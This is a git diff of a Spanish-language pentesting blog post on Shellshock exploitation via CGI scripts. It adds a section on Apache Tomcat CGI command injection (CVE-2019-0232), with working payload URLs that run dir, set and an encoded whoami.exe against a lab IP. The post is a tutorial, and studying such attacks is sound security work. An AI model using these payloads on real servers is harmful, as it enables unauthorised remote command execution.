@@ -3,7 +3,7 @@ date: 2022-05-19T01:40:05.000Z
 layout: post
 comments: true
 title: Ataque Shellshock
-subtitle: 'a través de cgi-bin'
+subtitle: 'a través de cgi'
 description: >-
 image: >-
     /images/shellshocklogo.png
@@ -16,18 +16,22 @@ tags:
   - exploit
   - vulnerabilidad
   - cgi-bin
+  - tomcat
+  - cgi
+  - CVE-2019-0232
+  - CVE-2014-6271
 author: Felipe Canales Cayuqueo
 paginate: true
 ---
 
-El ataque se Shellshock es una vulnerabilidad de ejecución remota de comandos por medio de bash, es decir, se basa en el hecho de que bash ejecuta incorrectamente los comandos finales cuando importa una definición de función almacenada en una variable de entorno. Para empezar intentaremos reconocer la vulnerabilidad:
+El ataque Shellshock es una vulnerabilidad de ejecución remota de comandos, es decir, se basa en el hecho de que bash o cmd ejecuta incorrectamente los comandos finales cuando importa una definición de función almacenada en una variable de entorno. Para empezar intentaremos reconocer la vulnerabilidad:
 
 * Una manera es observando el código fuente de la página, la cual nos puede entregar pistas sobre el directorio ```cgi-bin```:
 
 
 [![shellshockvuln](/images/shellshockvuln.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/shellshockvuln.png)
   
-* Una vez detectado podemos realizar fuzzing para ver que hay tras el directorio ```cgi-bin```:
+* Una vez detectado podemos realizar fuzzing para ver que hay tras el directorio ```cgi-bin``` (en algunos casos el directorio puede ser ```/cgi```) para ello debemos considerar las extensiones ```.cgi```, ```.sh```, ```.pl```, ```.py```, ```.bat``` y ```.cmd```:
 
 ```bash
 ┌─[root@kali]─[/shellshock]
@@ -51,6 +55,8 @@ Processed Requests: 441120
 Filtered Requests: 441118
 Requests/sec.: 0
 ```
+
+
 
 ### Verificación de vulnerabilidad
 
@@ -121,7 +127,7 @@ bash-4.3$
 
 Y recibimos respuesta en el puerto que teníamos a la escucha anteriormente.
 
-## Explotación por CURL
+### Explotación por CURL
 
 Para realizar la explotación por ```CURL``` probaremos ahora ```backup.cgi``` solo para demostrar que también funciona al igual que ```shell.sh```. En este caso nos pondremos también a la escucha:
 
@@ -154,3 +160,38 @@ bash-4.3$
 ```
 
 Y así es como se explotaría un ataque shellshock.
+ 
+### Tomcat CGI (CVE-2019-0232)
+
+Cuando se ejecuta en Windows con la opción enableCmdLineArguments habilitada, el CGI Servlet de Apache Tomcat (versiones 9.0.0.M1 a 9.0.17, 8.5.0 a 8.5.39 y 7.0.0 a 7.0.93) es vulnerable a ejecución remota de código (RCE) debido a un error en la forma en que la JRE pasa los argumentos de línea de comandos al sistema operativo Windows.
+
+Por defecto, el CGI Servlet se encuentra deshabilitado, y la opción enableCmdLineArguments también está desactivada de manera predeterminada en Tomcat 9.0.x (y se deshabilitará por defecto en todas las versiones como medida de mitigación ante esta vulnerabilidad).
+
+El servlet CGI es un componente vital de Apache Tomcat que permite que los servidores web se comuniquen con aplicaciones externas más allá de la JVM de Tomcat. Estas aplicaciones externas suelen ser scripts CGI escritos en lenguajes como Perl, Python o Bash. El servlet CGI recibe solicitudes de navegadores web y las reenvía a scripts CGI para su procesamiento.
+
+Entonces si tenemos la siguiente URL:
+
+```
+http://10.129.204.227:8080/cgi/welcome.bat
+```
+
+Podremos inyectar comandos comandos como:
+
+```
+http://10.129.204.227:8080/cgi/welcome.bat?&dir
+```
+
+También se puede recuperar una lista de las variables ambientales:
+
+```
+http://10.129.204.227:8080/cgi/welcome.bat?&set
+```
+
+Para ejecutar por ejemplo ```whoami.exe``` es necesario el uso de URL encode por los caracteres especiales.
+
+```
+http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
+```
+
+> La URL de arriba sin codificar quedaría http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe
+
